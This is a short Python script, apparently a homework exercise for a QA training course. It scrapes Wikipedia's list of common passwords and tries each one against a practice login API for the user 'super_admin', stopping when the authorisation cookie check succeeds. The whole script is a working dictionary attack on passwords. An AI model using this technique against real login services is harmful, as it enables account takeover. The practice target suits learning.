import requests
from bs4 import BeautifulSoup
import lxml

response = requests.get('https://en.wikipedia.org/wiki/List_of_the_most_common_passwords')
soup = BeautifulSoup(response.text, "lxml")
all_ps = [item.text.rstrip() for item in soup.findAll('td', attrs={'align': 'left'})]
needed_pass = set(all_ps[:225])
login = 'super_admin'
cookie_dict = {}
for i in needed_pass:
    response_get_secret_password = requests.post(
        url='https://playground.learnqa.ru/ajax/api/get_secret_password_homework',
        data={"login": login, 'password': i})
    cookie_dict = dict(response_get_secret_password.cookies)
    check_auth_cookie = requests.post(url='https://playground.learnqa.ru/ajax/api/check_auth_cookie',
                                      cookies=cookie_dict)
    if check_auth_cookie.text != 'You are NOT authorized':
        print('\n=============================')
        print(check_auth_cookie.text)
        print('Login: ', login)
        print('Password: ', i)
        break
